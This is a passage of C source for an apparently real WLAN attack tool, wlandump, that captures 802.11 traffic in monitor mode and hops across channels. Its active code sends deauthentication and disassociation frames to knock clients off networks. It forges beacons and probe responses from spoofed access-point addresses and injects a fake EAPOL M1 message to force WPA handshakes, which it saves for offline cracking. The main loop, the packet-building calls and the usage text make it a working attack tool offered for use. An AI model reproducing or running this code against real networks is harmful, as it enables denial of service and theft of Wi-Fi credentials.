#ifdef DOSTATUS
printf("start capturing...\n");
 #ifdef DOACTIVE
printf("own mac: ");
for (c = 0; c < 6; c++)
	printf("%02x", myaddr.addr[c]);
printf("\n");
 #endif
#endif

while(1)
	{
	pcapstatus = pcap_next_ex(pcapin, &pkh, &packet);
	if(pcapstatus == 0)
		continue;

	if(pcapstatus == -1)
		{
#ifdef DOGPIOSUPPORT
		system("reboot");
#endif

		fprintf(stderr, "pcap read error: %s \n", pcap_geterr(pcapin));
		continue;
		}

	if(pcapstatus == -2)
		{
		pcap_dump_flush(pcapout);
		if(staytimecount == 0)
			{
			channel++;
			if(channel > 13)
				{
				channel = 1;
#ifdef DOACTIVE
				zeiger = apliste;
				zeigersta = staliste;
				for(c = 0; c < APLISTESIZEMAX; c++)
					{
					zeiger->deauthcount = deauthmax;
					zeigersta->deauthcount = deauthmax;
					zeiger++;
					zeigersta++;
					}	
#endif
				}

			setchannel(interfacename, channel);
			staytimecount = staytime;
			}
		staytimecount--;
		continue;
		}

	if(pkh->caplen != pkh->len)
		continue;

	/* check radiotap-header */
	h80211 = packet;
	if(has_rth == TRUE)
		{
		rth = (rth_t*)packet;
		fcsl = 0;
		if((rth->it_present & 0x02) == 0x02)
			{
			field = 0x08;
			if((rth->it_present & 0x01) == 0x01)
				field += 0x0c;
			if((rth->it_present & 0x80000000) == 0x80000000)
				field += 0x04;
			if((packet[field] & 0x10) == 0x10)
				fcsl = 4;
			}

		pkh->caplen -= rth->it_len +fcsl;
		pkh->len -=  rth->it_len +fcsl;
		h80211 = packet + rth->it_len;
		}

	macf = (mac_t*)(h80211);
	macl = MAC_SIZE_NORM;
	if (macf->type == MAC_TYPE_CTRL)
		{
		if (macf->subtype == MAC_ST_RTS)
			macl = MAC_SIZE_RTS;
		else
			{
			if (macf->subtype == MAC_ST_ACK)
				macl = MAC_SIZE_ACK;
			}
		}
	 else
		{
		if (macf->type == MAC_TYPE_DATA)
			if (macf->subtype & MAC_ST_QOSDATA)
				macl += QOS_SIZE;
		}
	payload = ((uint8_t*)macf)+macl;

	/* check management frames */
	if(macf->type == MAC_TYPE_MGMT)
		{
		if(macf->subtype == MAC_ST_BEACON)
			{
			essidf = (essid_t*)(payload +BEACONINFO_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if(essidf->info_essid_len > 32)
				continue;
			if(essidf->info_essid_len == 0)
				continue;
			if(&essidf->essid[0] == 0)
				continue;
			if(handleapframes(macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
				{
				pcap_dump((u_char *) pcapout, pkh, h80211);
#ifdef DOACTIVE
				senddeauth(MAC_ST_DEAUTH, WLAN_REASON_PREV_AUTH_NOT_VALID, macf->addr1.addr, macf->addr2.addr);
#endif
#ifdef DOSTATUS
				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
				memset(&essidstr, 0, 34);
				memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
				printf("%s (beacon)\n", essidstr);
#endif
				}
			continue;
			}

		else if(macf->subtype == MAC_ST_PROBE_RESP)
			{
			essidf = (essid_t*)(payload +BEACONINFO_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if(essidf->info_essid_len > 32)
				continue;
			if(essidf->info_essid_len == 0)
				continue;
			if (&essidf->essid[0] == 0)
				continue;

			if(handleapframes(macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
				{
				pcap_dump((u_char *) pcapout, pkh, h80211);
#ifdef DOSTATUS
				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
				memset(&essidstr, 0, 34);
				memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
				printf("%s (proberesponse)\n", essidstr);
#endif
				}
			continue;
			}

		/* check proberequest frames */
		else if(macf->subtype == MAC_ST_PROBE_REQ)
			{
			essidf = (essid_t*)(payload);
			if(essidf->info_essid != 0)
				continue;
			if(essidf->info_essid_len > 32)
				continue;
			if(essidf->info_essid_len == 0)
				continue;
			if (&essidf->essid[0] == 0)
				continue;

			if(handlestaframes(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
				{
				pcap_dump((u_char *) pcapout, pkh, h80211);
#ifdef DOSTATUS
				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
				memset(&essidstr, 0, 34);
				memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
				printf("%s (proberequest)\n", essidstr);
#endif
				}
#ifdef DOACTIVE
			if(memcmp(&broadcast, macf->addr1.addr, 6) != 0)
				{
				sendproberesponse(channel, macf->addr2.addr, macf->addr1.addr, essidf->info_essid_len, essidf->essid);
				sendbeacon(channel, macf->addr1.addr, essidf->info_essid_len, essidf->essid);
				}
			else
				{
				zeiger = apliste;
				for(c = 0; c < APLISTESIZEMAX; c++)
					{
					if((zeiger->essid_len == essidf->info_essid_len) && (memcmp(zeiger->essid, essidf->essid, essidf->info_essid_len) == 0))
						{
						sendproberesponse(channel, macf->addr2.addr, zeiger->addr_ap.addr, essidf->info_essid_len, essidf->essid);
						sendbeacon(channel, zeiger->addr_ap.addr, essidf->info_essid_len, essidf->essid);
						break;
						}

					if(memcmp(&nullmac.addr, zeiger->addr_ap.addr, 6) == 0)
						{
						myaddr.addr[5] = myap & 0xff;
						myaddr.addr[4] = (myap >> 8) & 0xff;
						myaddr.addr[3] = (myap >> 16) & 0xff;
						myap++;
						sendproberesponse(channel, macf->addr2.addr, myaddr.addr, essidf->info_essid_len, essidf->essid);
						sendbeacon(channel, myaddr.addr, essidf->info_essid_len, essidf->essid);
						break;
						}
					zeiger++;
					}

				if(c >= APLISTESIZEMAX)
					{
					myaddr.addr[5] = myap & 0xff;
					myaddr.addr[4] = (myap >> 8) & 0xff;
					myaddr.addr[3] = (myap >> 16) & 0xff;
					myap++;
					sendproberesponse(channel, macf->addr2.addr, myaddr.addr, essidf->info_essid_len, essidf->essid);
					sendbeacon(channel, myaddr.addr, essidf->info_essid_len, essidf->essid);
					}
				}
#endif
			continue;
			}


		/* check associationrequest - reassociationrequest frames */
		else if(macf->subtype == MAC_ST_ASSOC_REQ)
			{
			essidf = (essid_t*)(payload +ASSOCIATIONREQF_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if(essidf->info_essid_len > 32)
				continue;
			if(essidf->info_essid_len == 0)
				continue;
			if (&essidf->essid[0] == 0)
				continue;

			if(handlestaframes(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
				pcap_dump((u_char *) pcapout, pkh, h80211);
#ifdef DOACTIVE
			sendacknowledgement(macf->addr2.addr);
			sendassociationresponse(MAC_ST_ASSOC_RESP, macf->addr2.addr, macf->addr1.addr);
			sendkey1(macf->addr2.addr, macf->addr1.addr);
#endif

#ifdef DOSTATUS
			printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
			memset(&essidstr, 0, 34);
			memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
			printf("%s (associationrequest)\n", essidstr);
#endif
			continue;
			}

		else if(macf->subtype == MAC_ST_REASSOC_REQ)
			{
			essidf = (essid_t*)(payload +REASSOCIATIONREQF_SIZE);
			if(essidf->info_essid != 0)
				continue;
			if(essidf->info_essid_len > 32)
				continue;
			if(essidf->info_essid_len == 0)
				continue;
			if (&essidf->essid[0] == 0)
				continue;

			if(handlestaframes(macf->addr1.addr, macf->addr2.addr, essidf->info_essid_len, essidf->essid) == FALSE)
				pcap_dump((u_char *) pcapout, pkh, h80211);

#ifdef DOACTIVE
			sendacknowledgement(macf->addr2.addr);
			sendassociationresponse(MAC_ST_REASSOC_RESP, macf->addr2.addr, macf->addr1.addr);
			sendkey1(macf->addr2.addr, macf->addr1.addr);
#endif


#ifdef DOSTATUS
			printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
			memset(&essidstr, 0, 34);
			memcpy(&essidstr, essidf->essid, essidf->info_essid_len);
			printf("%s (reassociationrequest)\n", essidstr);
#endif
			continue;
			}

		else if(macf->subtype == MAC_ST_AUTH)
			{
#ifdef DOACTIVE
			authenticationreq = (authf_t*)(payload);
			if(authenticationreq->authentication_seq == 1)
				{
				sendacknowledgement(macf->addr2.addr);
				sendauthentication(macf->addr2.addr, macf->addr1.addr);
				}
#endif

#ifdef DOSTATUS
			if(authenticationreq->authentication_seq == 1)
				{
				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
				printf("(authenticationrequest)\n");
				}
			else
				{
				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
				printf("(authenticationresponse)\n");
				}
#endif
			continue;
			}
		continue;
		}

	/* powersave */
	if((macf->type == MAC_TYPE_DATA) && ((macf->subtype == MAC_ST_NULL)|| (macf->subtype == MAC_ST_QOSNULL)))
		{
#ifdef DOACTIVE
		if((macf->to_ds == 1) && (macf->power == 0))
			{
			zeigersta = staliste;
			for(c = 0; c < APLISTESIZEMAX; c++)
				{
				if(memcmp(zeigersta->addr_sta.addr, macf->addr2.addr, 6) == 0)
					{
					if(zeigersta->deauthcount > 0)
						{
						senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY, macf->addr1.addr, macf->addr2.addr);
						zeigersta->deauthcount -= 1;
						}
					}
				zeigersta++;
				}
			}
#endif
		continue;
		}


	/* check handshake frames */
	if(macf->type == MAC_TYPE_DATA && LLC_SIZE <= pkh->len && be16toh(((llc_t*)payload)->type) == LLC_TYPE_AUTH)
		{
		eap = (eap_t*)(payload + LLC_SIZE);

		if(eap->type == 3)
			{
			pcap_dump((u_char *) pcapout, pkh, h80211);

#ifdef DOACTIVE
			mkey = geteapkey(eap);
			if(mkey == 4)
				senddeauth(MAC_ST_DISASSOC, WLAN_REASON_DISASSOC_AP_BUSY, macf->addr2.addr, macf->addr1.addr);
#endif
#ifdef DOSTATUS
			replaycount = getreplaycount(eap);
			if(mkey == 1)
				{
				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
				if(checkmynonce(eap) == TRUE)
					printf("M1 message (replaycount: %lld transmitted by wlandump)\n", replaycount);
				else
					printf("M1 message (replaycount: %lld)\n", replaycount);
				}

			if(mkey == 2)
				{
				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
				if(replaycount == MYREPLAYCOUNT)
					printf("\x1B[32mM2 message (replaycount: %lld wlandump forced handshake)\x1B[0m\n", replaycount);
				else
					printf("M2 message (replaycount: %lld)\n", replaycount);
				}

			if(mkey == 3)
				{
				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);
				printf("M3 message (replaycount: %lld)\n", replaycount);
				}

			if(mkey == 4)
				{
				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
				printf("M4 message (replaycount: %lld)\n", replaycount);
				}
#endif
			continue;
			}

		if(eap->type == 0)
			{
			pcap_dump((u_char *) pcapout, pkh, h80211);
#ifdef DOSTATUS
			eapext = (eapext_t*)(payload + LLC_SIZE);
			if(macf->from_ds == 1) /* sta - ap */
				printaddr(macf->addr1.addr, macf->addr2.addr, TRUE);

			if(macf->to_ds == 1) /* ap - sta */
				printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);

			if(eapext->len >= 4)
				{
				if(eapext->eapcode == EAP_CODE_REQ)
					{
					printf("\x1B[36meap extended data\x1B[0m\n");
					}

				if(eapext->eapcode == EAP_CODE_RESP)
					{
					printf("\x1B[36meap extended data\x1B[0m\n");
					}
				}
#endif
			continue;
			}

		if(eap->type == 0)
			{
#ifdef DOSTATUS
			printaddr(macf->addr2.addr, macf->addr1.addr, FALSE);
			printf("\x1B[36mstart\x1B[0m\n");
#endif
			continue;
			}



		}
	}
return;
}
/*===========================================================================*/
int startcapturing(char *pcapoutname, int staytime)
{
struct stat statinfo;
struct bpf_program filter;
pcap_t *pcapdh = NULL;
int filecount = 1;
int datalink = 0;
int pcapstatus;
int has_rth = FALSE;
#ifdef DOGPIOSUPPORT
int c;
#endif

char newpcapoutname[PATH_MAX +2];
char pcaperrorstring[PCAP_ERRBUF_SIZE];


if(pcapoutname == NULL)
	{
	fprintf(stderr, "no output file selected\n");
	exit(EXIT_FAILURE);
	}


pcapin = pcap_create(interfacename,pcaperrorstring);
if(pcapin == NULL)
	{
	fprintf(stderr, "error opening device %s\n", interfacename);
	exit(EXIT_FAILURE);
	}

pcapstatus = pcap_set_snaplen(pcapin, 0xfff);
if(pcapstatus != 0)
	{
	fprintf(stderr, "error setting snaplen\n");
	exit(EXIT_FAILURE);
	}

pcapstatus = pcap_set_buffer_size(pcapin, 0xffffff);
if(pcapstatus != 0)
	{
	fprintf(stderr, "error setting buffersize\n");
	exit(EXIT_FAILURE);
	}

pcapstatus = pcap_set_timeout(pcapin, 0);
if(pcapstatus != 0)
	{
	fprintf(stderr, "error setting timeoutn\n");
	exit(EXIT_FAILURE);
	}

pcapstatus = pcap_set_promisc(pcapin, 1);
if(pcapstatus != 0)
	{
	fprintf(stderr, "error setting promisc mode\n");
	exit(EXIT_FAILURE);
	}

pcapstatus = pcap_set_rfmon(pcapin, 1);
if(pcapstatus != 0)
	{
	fprintf(stderr, "error setting rfmon mode\n");
	exit(EXIT_FAILURE);
	}

pcapstatus = pcap_activate(pcapin);
if(pcapstatus != 0)
	{
	fprintf(stderr, "error activating capture\n");
	exit(EXIT_FAILURE);
	}

datalink = pcap_datalink(pcapin);
	if (datalink == DLT_IEEE802_11_RADIO)
		has_rth = TRUE;

if (pcap_compile(pcapin, &filter,filterstring, 1, 0) < 0)
	{
	fprintf(stderr, "error compiling bpf filter %s \n", pcap_geterr(pcapin));
	exit(EXIT_FAILURE);
	}
if (pcap_setfilter(pcapin, &filter) < 0)
	{
	sprintf(pcaperrorstring, "error installing packet filter ");
	pcap_perror(pcapin, pcaperrorstring);
	exit(EXIT_FAILURE);
	}

pcap_freecode(&filter);


strcpy(newpcapoutname, pcapoutname);
while(stat(newpcapoutname, &statinfo) == 0)
	{
	snprintf(newpcapoutname, PATH_MAX, "%s-%d.cap", pcapoutname, filecount);
	filecount++;
	}
pcapdh = pcap_open_dead(DLT_IEEE802_11, 65535);
if ((pcapout = pcap_dump_open(pcapdh, newpcapoutname)) == NULL)
	{
	fprintf(stderr, "error creating dump file %s\n", newpcapoutname);
	exit(EXIT_FAILURE);
	}

setchannel();
#ifdef DOSTATUS
		printf("%02d interface set to channel\n", channel);
#endif


#ifdef DOGPIOSUPPORT
if(wiringPiSetup() == -1)
	{
	puts ("wiringPi failed!");
	programmende(SIGINT);
	}

pinMode(0, OUTPUT);
pinMode(7, INPUT);

for (c = 0; c < 5; c++)
	{
	digitalWrite(0 , HIGH);
	delay (200);
	digitalWrite(0, LOW);
	delay (200);
	}
#endif

signal(SIGINT, programmende);
signal(SIGALRM, sigalarm);
alarm(5);

pcaploop(has_rth, staytime);

pcap_dump_flush(pcapout);
pcap_dump_close(pcapout);
pcap_close(pcapin);
printf("program unconditionally stopped...\n");
return TRUE;
}
/*===========================================================================*/
static void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION, VERSION_JAHR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
static void usage(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n"
	"usage: %s <options>\n"
	"(ctrl+c terminates program)\n"
	"options:\n"
	"-i <interface> : WLAN interface\n"
	"-o <file>      : output cap file\n"
	"-c <channel>   : start channel (1 - 13)\n"
	"               : default = 1\n"
	"-t <time>      : stay time x * 5 seconds on channel before hopping to the next channel\n"
	"               : default = 5 seconds\n"
	"-d <number>    : send up to x deauthentication/disassociation packets per channel\n"
	"               : default = up to 2 deauthentication/disassociation packets\n"
	"-V <digit>     : accesspoint vendor xxxxxx\n"
	"-h             : help screen\n"
	"-v             : version\n"
	"\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
static void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
pcap_if_t *alldevs, *d;
int auswahl;
int staytime = 1;
char *eigenpfadname, *eigenname;
char *pcapoutname = NULL;

char pcaperrorstring[PCAP_ERRBUF_SIZE];

eigenpfadname = strdupa(argv[0]);
eigenname = basename(eigenpfadname);


setbuf(stdout, NULL);
srand(time(NULL));
while ((auswahl = getopt(argc, argv, "i:o:c:t:d:V:hv")) != -1)
	{
	switch (auswahl)
		{
		case 'i':
		interfacename = optarg;
		if(interfacename == NULL)
			{
			fprintf(stderr, "no interface specified\n");
			exit (EXIT_FAILURE);
			}
		break;

		case 'o':
		pcapoutname = optarg;
		break;

		case 'c':
		channel = strtol(optarg, NULL, 10);
		if((channel < 1) || (channel > 13))
			{
			fprintf(stderr, "wrong channel, only 1 - 13 allowed\nsetting channel to default (1)\n");
			channel = 1;
			}
		break;

		case 't':
		staytime = strtol(optarg, NULL, 10);
		if(staytime < 1)
			{
			fprintf(stderr, "wrong hoptime\nsetting hoptime to 1 ( 1 = 5 seconds\n");
			staytime = 5;
			}
		break;

		case 'd':
		deauthmax = strtol(optarg, NULL, 10);
		break;

		case 'V':
			sscanf(optarg, "%06x", &myoui);
		break;

		case 'h':
		usage(eigenname);
		break;

		case 'v':
		version(eigenname);
		break;

		default:
		usageerror(eigenname);
		break;
		}
	}

if( getuid() != 0 )
	{
	fprintf(stderr, "this program requires root privileges\n" );
	exit(EXIT_FAILURE);
	}

if(interfacename == NULL)
	{
	fprintf(stdout,"\nno device selected - suitable devices:\n--------------------------------------\n");

	if(pcap_findalldevs(&alldevs, pcaperrorstring) == -1)
		{
		fprintf(stderr,"error in pcap_findalldevs: %s\n", pcaperrorstring);
		exit (EXIT_FAILURE);
		}

	for(d=alldevs; d; d=d->next)
		{
		fprintf(stdout, "%s", d->name);
		if(d->description)
			printf(" (%s)\n", d->description);

		else
		fprintf(stdout," (no description available)\n");
		}

	pcap_freealldevs(alldevs);
	exit (EXIT_FAILURE);
	}

if(initgloballists() != TRUE)
	{
	fprintf(stderr, "could not allocate memory for tables\n" );
	exit (EXIT_FAILURE);
	}

if(startcapturing(pcapoutname, staytime) == FALSE)
	{
	fprintf(stderr, "could not init devices or outputfile\n" );
	exit (EXIT_FAILURE);
	}

return EXIT_SUCCESS;
}
/*===========================================================================*/
